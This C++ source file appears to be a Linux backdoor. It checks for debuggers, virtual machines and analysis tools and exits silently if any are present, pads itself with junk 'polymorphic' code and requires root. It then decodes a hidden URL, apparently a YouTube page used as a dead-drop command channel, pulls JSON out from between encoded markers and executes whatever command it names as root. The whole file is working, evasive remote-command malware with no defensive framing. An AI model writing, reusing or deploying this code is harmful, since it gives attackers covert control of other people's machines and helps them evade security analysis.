#include <iostream>
#include <cstdlib>
#include <cstring>
#include <vector>
#include <string>
#include <json/json.h>
#include <curl/curl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <unordered_map>
#include <sstream>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <fstream>

// Anti-analysis constants
#define TIMING_THRESHOLD 1000
#define MEMORY_THRESHOLD 1000000

namespace {
    // Anti-debugging and analysis detection
    class AntiAnalysis {
    private:
        static bool checkTiming() {
            struct timeval start, end;
            gettimeofday(&start, nullptr);
            
            // Perform operations that would be slow under analysis
            volatile int dummy = 0;
            for (volatile int i = 0; i < 1000000; ++i) {
                dummy += i;
            }
            
            gettimeofday(&end, nullptr);
            long elapsed = (end.tv_sec - start.tv_sec) * 1000000 + (end.tv_usec - start.tv_usec);
            
            return elapsed < TIMING_THRESHOLD;
        }
        
        static bool checkMemoryUsage() {
            struct rusage usage;
            if (getrusage(RUSAGE_SELF, &usage) == 0) {
                return usage.ru_maxrss < MEMORY_THRESHOLD;
            }
            return false;
        }
        
        static bool checkVMIndicators() {
            // Check for VM artifacts
            std::ifstream cpuinfo("/proc/cpuinfo");
            if (cpuinfo.is_open()) {
                std::string line;
                while (std::getline(cpuinfo, line)) {
                    if (line.find("hypervisor") != std::string::npos ||
                        line.find("VMware") != std::string::npos ||
                        line.find("VirtualBox") != std::string::npos ||
                        line.find("QEMU") != std::string::npos ||
                        line.find("Xen") != std::string::npos) {
                        return true;
                    }
                }
            }
            
            // Check VM-specific files
            std::vector<std::string> vm_files = {
                "/sys/class/dmi/id/product_name",
                "/sys/class/dmi/id/sys_vendor"
            };
            
            for (const auto& file : vm_files) {
                std::ifstream f(file);
                if (f.is_open()) {
                    std::string content;
                    std::getline(f, content);
                    if (content.find("VMware") != std::string::npos ||
                        content.find("Virtual") != std::string::npos ||
                        content.find("QEMU") != std::string::npos) {
                        return true;
                    }
                }
            }
            
            return false;
        }
        
        static bool checkDebugger() {
            // Multiple anti-debugging techniques
            if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
                return true;
            }
            ptrace(PTRACE_DETACH, 0, 1, 0);
            
            // Check for debugger environment variables
            const char* debug_vars[] = {"GDB", "DBX", "LDB", "LLDB"};
            for (const auto& var : debug_vars) {
                if (getenv(var)) return true;
            }
            
            // Check for debugger processes
            std::vector<std::string> debuggers = {"gdb", "lldb", "dbx", "windbg", "ollydbg"};
            for (const auto& debugger : debuggers) {
                std::string cmd = "pgrep " + debugger + " >/dev/null 2>&1";
                if (system(cmd.c_str()) == 0) return true;
            }
            
            return false;
        }
        
        static bool checkAnalysisTools() {
            // Check for analysis tools
            std::vector<std::string> tools = {"wireshark", "tcpdump", "strace", "ltrace", "valgrind"};
            for (const auto& tool : tools) {
                std::string cmd = "pgrep " + tool + " >/dev/null 2>&1";
                if (system(cmd.c_str()) == 0) return true;
            }
            
            return false;
        }
        
    public:
        static bool isUnderAnalysis() {
            return checkTiming() || 
                   checkMemoryUsage() || 
                   checkVMIndicators() || 
                   checkDebugger() || 
                   checkAnalysisTools();
        }
    };

    // Polymorphic code execution
    class CodePolymorphism {
    private:
        static int generateRandomValue() {
            static int seed = 0;
            seed = (seed * 1103515245 + 12345) & 0x7fffffff;
            return seed % 1000;
        }
        
    public:
        static void executePolymorphicCode() {
            int path = generateRandomValue() % 3;
            
            switch (path) {
                case 0: {
                    volatile int a = 1, b = 1, c;
                    for (volatile int i = 0; i < 10; ++i) {
                        c = a + b;
                        a = b;
                        b = c;
                    }
                    break;
                }
                case 1: {
                    volatile int num = 17;
                    volatile bool isPrime = true;
                    for (volatile int i = 2; i * i <= num; ++i) {
                        if (num % i == 0) {
                            isPrime = false;
                            break;
                        }
                    }
                    break;
                }
                case 2: {
                    volatile char str[] = "POLYMORPHIC";
                    volatile int len = static_cast<int>(strlen(static_cast<const char*>(str)));
                    for (volatile int i = 0; i < len / 2; ++i) {
                        volatile char temp = str[i];
                        str[i] = str[len - 1 - i];
                        str[len - 1 - i] = temp;
                    }
                    break;
                }
            }
        }
    };
}

// Mean and clean banner
std::string getBanner() {
    return R"(
                                                                                                    
                                                                                                    
                                                                                                    
                                                  ▓██                                               
                                                ▓█████▓                                             
                                               ████ ████▒                                           
                                             ████  █▓ ████▒                                         
                                           ████  █████▒ ████                                        
                                         ████▓ ███████▓█ ▒████                                      
                                       ▓███▓ ███████▒████▓ ▒████                                    
                                     ▓████ ▓██████ ████████▓ ▓███▓                                  
                                    ████ ▓██████ ████████████  ████▓                                
                                  ████  ██████▒██████▓ ██████ ▓  ████▒                              
                                ████  ██████▒███████ ██████▓ ████  ████                             
                              ████  ██████▓▓██████ ▓█████▓ ██████ ▓  ████                           
                            ▓███▓ ███████▓██████ ▓██████ ██████▓▓███▓ ▒████                         
                           ▓███▓ ▓███████ ████▒ ██████ ███████▓██████  ▓████                        
                             ████▓ ████████ ▒ ██████ ▓██████ ██████   ████                          
                               ████  ███████▓▓████████████ ██████   ████                            
                                 ████  ███████▓▓████████ ██████▓  ████                              
                                   ████ ▒███████ █████░██████▓  ████▒                               
                                     ████ ▒███████ █░▓█████▓  ▓███▒                                 
                                      ░███▓ ▓█████████████  ▒███▓                                   
                                        ▓███▓ ██████████  ▒████                                     
                                          ████▓ ██████   ████                                       
                                            ████  ██   ████                                         
                                              ████   ████                                           
                                                ███████▓                                            
                                                 ▒███▓                                              
                                                   ▓                                                
                                                                                                    
                    ░░     ░▒      ░▒       ░░        ░▒                                            
                 ███▓▓██ ▓█▓▓██  ██▒▒▓▓  ███▓▓███  ▓██▓▓▓█▒ ██  ▒█▓▓▓▓▓ ▓▓▓█▓▓▓ ██  ██              
                ░██         ▒██  █████  ▓█▓    ▓█▒ ██       ██  ▒█████    ▓█▒    ████               
                 ██    ░  ▒██        ██  ██    ██  ██▒   ▒  ██  ▒█▓       ▓█▒     ██                
                  ▓████▓ ▓██████ ▓████▓   ▓████▓    ▒████▓  ██  ▒██████   ▓█▒     ██                
                                                                                                    
                                                                                                    
                                                                                          
)";
}

// Clean and efficient base64 decode
std::string base64Decode(const std::string &encoded) {
    BIO *bio, *b64;
    size_t decodedLength = (encoded.length() * 3) / 4;
    char *decoded = (char *)malloc(decodedLength + 1);
    if (!decoded) {
        return "";
    }

    memset(decoded, 0, decodedLength + 1);

    bio = BIO_new_mem_buf(encoded.data(), -1);
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_push(b64, bio);

    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    int length = BIO_read(bio, decoded, encoded.length());
    if (length < 0) {
        BIO_free_all(bio);
        free(decoded);
        return "";
    }
    decoded[length] = '\0';

    BIO_free_all(bio);

    std::string result(decoded);
    free(decoded);
    return result;
}

// Efficient HTML entity decoding
std::string decodeHTMLEntities(const std::string &text) {
    std::unordered_map<std::string, char> entities = {
        {"&quot;", '\"'},
        {"&amp;", '&'},
        {"&lt;", '<'},
        {"&gt;", '>'},
        {"&apos;", '\''}
    };

    std::string decoded;
    size_t pos = 0;
    size_t found = text.find('&', pos);
    while (found != std::string::npos) {
        decoded.append(text, pos, found - pos);
        size_t semicolon = text.find(';', found);
        if (semicolon != std::string::npos) {
            std::string entity = text.substr(found, semicolon - found + 1);
            if (entities.find(entity) != entities.end()) {
                decoded.push_back(entities[entity]);
                pos = semicolon + 1;
            } else {
                decoded.append(entity);
                pos = semicolon + 1;
            }
        } else {
            decoded.push_back('&');
            pos = found + 1;
        }
        found = text.find('&', pos);
    }
    decoded.append(text, pos, text.length() - pos);
    return decoded;
}

// Enhanced root check
bool checkForRoot() {
    return geteuid() == 0;
}

// Clean callback function
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

// Signal handlers for silent exits
void handleSigtrap(int sig) { _exit(1); }
void handleSigsegv(int sig) { _exit(1); }
void handleSigill(int sig) { _exit(1); }

// Main execution function - clean and mean
void run() {
    // Execute polymorphic code to confuse analysis
    CodePolymorphism::executePolymorphicCode();
    
    // Decode URLs directly (they're already base64)
    std::string url = base64Decode("aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1HeUVlZGZNTGlKSQ==");
    std::string start = base64Decode("U1RBUlRUSEVUUFoyMDIy");
    std::string end = base64Decode("RU5EVEhFVFBaMjAyMg==");

    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return;
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

    // More polymorphic code
    CodePolymorphism::executePolymorphicCode();

    size_t startIndex = readBuffer.find(start);
    size_t endIndex = readBuffer.find(end);

    if (startIndex == std::string::npos || endIndex == std::string::npos || startIndex >= endIndex) {
        return;
    }

    std::string object = readBuffer.substr(startIndex + start.length(), endIndex - (startIndex + start.length()));
    object = decodeHTMLEntities(object);

    Json::Value controll;
    Json::CharReaderBuilder builder;
    std::string errs;
    std::istringstream iss(object);
    if (!Json::parseFromStream(builder, iss, &controll, &errs)) {
        return;
    }

    if (controll.isMember("run_commands") && controll["run_commands"].asString() != "false") {
        std::string command = controll["run_commands"].asString();
        std::vector<char*> args;
        char* cmd = strdup(command.c_str());
        if (!cmd) {
            return;
        }

        char* token = strtok(cmd, " ");
        while (token != nullptr) {
            args.push_back(token);
            token = strtok(nullptr, " ");
        }
        args.push_back(nullptr);

        pid_t pid = fork();
        if (pid == 0) {
            execvp(args[0], args.data());
            _exit(EXIT_FAILURE);
        } else if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
        }

        free(cmd);
    }
}

int main() {
    // Set up signal handling for silent exits
    signal(SIGTRAP, handleSigtrap);
    signal(SIGSEGV, handleSigsegv);
    signal(SIGILL, handleSigill);
    
    // Check if under analysis - exit silently if detected
    if (AntiAnalysis::isUnderAnalysis()) {
        _exit(1);
    }
    
    // Execute polymorphic code
    CodePolymorphism::executePolymorphicCode();
    
    // Check for root privileges
    if (!checkForRoot()) {
        _exit(1);
    }

    // Display the mean banner
    std::cout << getBanner() << std::endl;

    // Execute main logic
    run();

    return 0;
}
